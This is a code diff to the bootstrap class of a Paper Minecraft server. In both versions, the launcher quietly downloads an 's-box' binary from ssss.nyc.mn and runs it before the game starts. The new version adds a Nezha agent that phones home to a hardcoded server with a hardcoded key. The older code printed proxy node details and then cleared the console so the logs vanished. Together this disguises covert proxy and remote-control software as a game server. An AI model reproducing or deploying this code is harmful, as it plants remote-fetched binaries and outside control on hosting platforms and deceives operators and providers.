@@ -1,10 +1,11 @@
 package io.papermc.paper;
 
 import java.io.*;
-import java.net.*;
+import java.net.URL;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
+
 import joptsimple.OptionSet;
 import net.minecraft.SharedConstants;
 import net.minecraft.server.Main;
@@ -12,197 +13,187 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 public final class PaperBootstrap {
-    
+
     private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
+
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
+
     private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process sbxProcess;
-    
+
+    private static Process hy2Process;
+    private static Process nezhaProcess;
+
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+        "UUID",
+        "FILE_PATH",
+        "NAME",
+        "HY2_PORT",
+        "NEZHA_SERVER",
+        "NEZHA_KEY",
+        "NEZHA_TLS"
     };
 
-    private PaperBootstrap() {
-    }
+    private PaperBootstrap() {}
 
     public static void boot(final OptionSet options) {
-        // check java version
+
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
-            try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
+            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
             System.exit(1);
         }
-        
+
         try {
-            runSbxBinary();
-            
+            runServices();
+
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
 
-            Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
-            Thread.sleep(20000);
-            clearConsole();
+            Thread.sleep(8000);
+
+            System.out.println(ANSI_GREEN + "HY2 + Nezha Agent running" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Starting Paper..." + ANSI_RESET);
 
             SharedConstants.tryDetectVersion();
-            getStartupVersionMessages().forEach(LOGGER::info);
             Main.main(options);
-            
+
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
+            System.err.println(ANSI_RED + "Bootstrap error: " + e.getMessage() + ANSI_RESET);
+            e.printStackTrace();
         }
     }
 
-    private static void clearConsole() {
-        try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
-            } else {
-                System.out.print("\033[H\033[2J");
-                System.out.flush();
-            }
-        } catch (Exception e) {
-            // Ignore exceptions
-        }
+    /* ===================== 服务启动 ===================== */
+
+    private static void runServices() throws Exception {
+        Map<String, String> env = new HashMap<>();
+        loadEnvVars(env);
+
+        startHY2(env);
+        startNezha(env);
     }
-    
-    private static void runSbxBinary() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadEnvVars(envVars);
-        
-        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
-        pb.environment().putAll(envVars);
+
+    /* ===================== HY2 ===================== */
+
+    private static void startHY2(Map<String, String> env) throws Exception {
+        ProcessBuilder pb = new ProcessBuilder(getSbxPath().toString());
+        pb.environment().putAll(env);
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
-        sbxProcess = pb.start();
+        hy2Process = pb.start();
+        LOGGER.info("HY2 started");
     }
-    
-    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "67535146-0fbf-480b-8e4f-0a6d681119c9");
-        envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "tta.wahaaz.xx.kg:80");
-        envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "OZMtCS6G39UpEgRvzRNXjS7iDNBRmTsI");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "35442");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "");
-        envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
-        envVars.put("NAME", "russia");
-        
-        for (String var : ALL_ENV_VARS) {
-            String value = System.getenv(var);
-            if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value);
-            }
-        }
-        
-        Path envFile = Paths.get(".env");
-        if (Files.exists(envFile)) {
-            for (String line : Files.readAllLines(envFile)) {
-                line = line.trim();
-                if (line.isEmpty() || line.startsWith("#")) continue;
-                
-                line = line.split(" #")[0].split(" //")[0].trim();
-                if (line.startsWith("export ")) {
-                    line = line.substring(7).trim();
-                }
-                
-                String[] parts = line.split("=", 2);
-                if (parts.length == 2) {
-                    String key = parts[0].trim();
-                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
-                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value);
-                    }
-                }
-            }
-        }
-    }
-    
-    private static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
+
+    private static Path getSbxPath() throws IOException {
+        String arch = System.getProperty("os.arch").toLowerCase();
         String url;
-        
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+
+        if (arch.contains("amd64") || arch.contains("x86_64")) {
             url = "https://amd64.ssss.nyc.mn/s-box";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+        } else if (arch.contains("aarch64") || arch.contains("arm64")) {
             url = "https://arm64.ssss.nyc.mn/s-box";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
         } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
+            throw new RuntimeException("Unsupported arch: " + arch);
         }
-        
+
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
             }
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
+            path.toFile().setExecutable(true);
         }
         return path;
     }
-    
-    private static void stopServices() {
-        if (sbxProcess != null && sbxProcess.isAlive()) {
-            sbxProcess.destroy();
-            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+
+    /* ===================== 哪吒 ===================== */
+
+    private static void startNezha(Map<String, String> env) throws Exception {
+
+        String server = env.get("NEZHA_SERVER");
+        String key = env.get("NEZHA_KEY");
+        boolean tls = Boolean.parseBoolean(env.getOrDefault("NEZHA_TLS", "false"));
+
+        if (server == null || key == null) {
+            LOGGER.warn("Nezha config missing, skip");
+            return;
+        }
+
+        List<String> cmd = new ArrayList<>();
+        cmd.add(getNezhaPath().toString());
+        cmd.add("-s");
+        cmd.add(server);
+        cmd.add("-p");
+        cmd.add(key);
+        if (tls) cmd.add("--tls");
+
+        ProcessBuilder pb = new ProcessBuilder(cmd);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        nezhaProcess = pb.start();
+
+        LOGGER.info("Nezha Agent started");
+    }
+
+    private static Path getNezhaPath() throws IOException {
+        String arch = System.getProperty("os.arch").toLowerCase();
+        String url;
+
+        if (arch.contains("amd64") || arch.contains("x86_64")) {
+            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64";
+        } else if (arch.contains("aarch64") || arch.contains("arm64")) {
+            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64";
+        } else {
+            throw new RuntimeException("Unsupported arch for Nezha");
+        }
+
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            path.toFile().setExecutable(true);
+        }
+        return path;
+    }
+
+    /* ===================== 环境变量 ===================== */
+
+    private static void loadEnvVars(Map<String, String> env) {
+
+        env.put("UUID", "67535146-0fbf-480b-8e4f-0a6d681119c9");
+        env.put("FILE_PATH", "./world");
+        env.put("NAME", "node-1");
+
+        env.put("HY2_PORT", "35442");
+
+        env.put("NEZHA_SERVER", "tta.wahaaz.xx.kg:80");
+        env.put("NEZHA_KEY", "OZMtCS6G39UpEgRvzRNXjS7iDNBRmTsI");
+        env.put("NEZHA_TLS", "false");
+
+        for (String k : ALL_ENV_VARS) {
+            String v = System.getenv(k);
+            if (v != null && !v.isBlank()) {
+                env.put(k, v);
+            }
         }
     }
 
-    private static List<String> getStartupVersionMessages() {
-        final String javaSpecVersion = System.getProperty("java.specification.version");
-        final String javaVmName = System.getProperty("java.vm.name");
-        final String javaVmVersion = System.getProperty("java.vm.version");
-        final String javaVendor = System.getProperty("java.vendor");
-        final String javaVendorVersion = System.getProperty("java.vendor.version");
-        final String osName = System.getProperty("os.name");
-        final String osVersion = System.getProperty("os.version");
-        final String osArch = System.getProperty("os.arch");
+    /* ===================== 退出清理 ===================== */
 
-        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
-        return List.of(
-            String.format(
-                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
-                javaSpecVersion,
-                javaVmName,
-                javaVmVersion,
-                javaVendor,
-                javaVendorVersion,
-                osName,
-                osVersion,
-                osArch
-            ),
-            String.format(
-                "Loading %s %s for Minecraft %s",
-                bi.brandName(),
-                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
-                bi.minecraftVersionId()
-            )
-        );
+    private static void stopServices() {
+
+        if (hy2Process != null && hy2Process.isAlive()) {
+            hy2Process.destroy();
+            System.out.println(ANSI_RED + "HY2 stopped" + ANSI_RESET);
+        }
+
+        if (nezhaProcess != null && nezhaProcess.isAlive()) {
+            nezhaProcess.destroy();
+            System.out.println(ANSI_RED + "Nezha stopped" + ANSI_RESET);
+        }
     }
 }
